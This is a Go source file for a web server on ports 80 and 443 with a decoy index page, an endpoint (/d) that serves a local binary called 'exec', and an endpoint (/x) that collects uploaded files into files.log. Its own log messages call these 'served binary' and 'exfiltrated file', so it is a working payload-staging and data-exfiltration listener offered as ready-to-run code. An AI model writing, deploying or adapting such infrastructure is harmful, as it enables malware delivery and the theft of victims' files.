package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
)

func Index(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte("nothing to see here..."))
}
func Download(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	fp, err := os.Open("exec")
	if err != nil {
		log.Printf("error: %s", err.Error())
		return
	}
	defer fp.Close()
	a, err := ioutil.ReadAll(fp)
	if err != nil {
		log.Printf("failed reading file: %s", err.Error())
		return
	}
	w.Write(a)
	log.Printf("served binary to %s", req.RemoteAddr)
}
func Dump(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Content-Type", "text/plain")
	if req.Method == "POST" {
		fp, err := os.OpenFile("files.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
		if err != nil {
			log.Println("failed opening files.log, check your permissions")
			return
		}
		defer fp.Close()
		err = req.ParseMultipartForm(32 << 20) // maxMemory 32MB
		if err != nil {
			log.Printf("failed parsing multipart form from %s", req.RemoteAddr)
			return
		}
		f, _, err := req.FormFile("f")
		if err != nil {
			log.Printf("failed getting form file from %s", req.RemoteAddr)
			return
		}
		dat, err := ioutil.ReadAll(f)
		if err == nil {
			_, err = fp.WriteString(fmt.Sprintf("[+] file from %s\n%s\n\n", req.RemoteAddr, string(dat)))
			if err != nil {
				return
			}
			log.Printf("exfiltrated file from %s", req.RemoteAddr)
		}
	}
}
func main() {
	http.HandleFunc("/", Index)
	http.HandleFunc("/x", Dump)
	http.HandleFunc("/d", Download)

	//  Start HTTP
	go func() {
		httperr := http.ListenAndServe("0.0.0.0:80", nil)
		if httperr != nil {
			log.Fatalf("failed starting http server: %v\n ", httperr)
		}
	}()
	httpserr := http.ListenAndServeTLS("0.0.0.0:443", "server.crt", "server.key", nil)
	if httpserr != nil {
		log.Fatalf("failed to start https server: %v\n", httpserr)
	}
}
